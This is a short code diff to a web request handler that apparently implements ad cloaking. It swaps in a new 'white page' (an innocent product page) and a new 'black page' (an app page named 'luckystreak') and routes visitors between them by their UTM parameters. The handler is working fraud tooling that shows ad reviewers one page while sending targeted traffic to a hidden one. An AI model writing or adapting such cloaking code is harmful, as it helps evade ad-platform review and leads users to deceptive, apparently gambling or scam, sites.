@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://homedecorlampify.com/product/sierra-sunset-neoclassical-table-lamps-pair/";
-    const blackPageURL = "https://ubuzznotifier.lovable.app/";
+    const whitePageURL = "https://sheenora.pk/products/beigelle?pr_prod_strat=e5_desc&pr_rec_id=ef0aaf4e0&pr_rec_pid=7740934684726&pr_ref_pid=7740959162422&pr_seq=uniform%3Fvariant%3D43456496599094";
+    const blackPageURL = "https://luckystreak.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
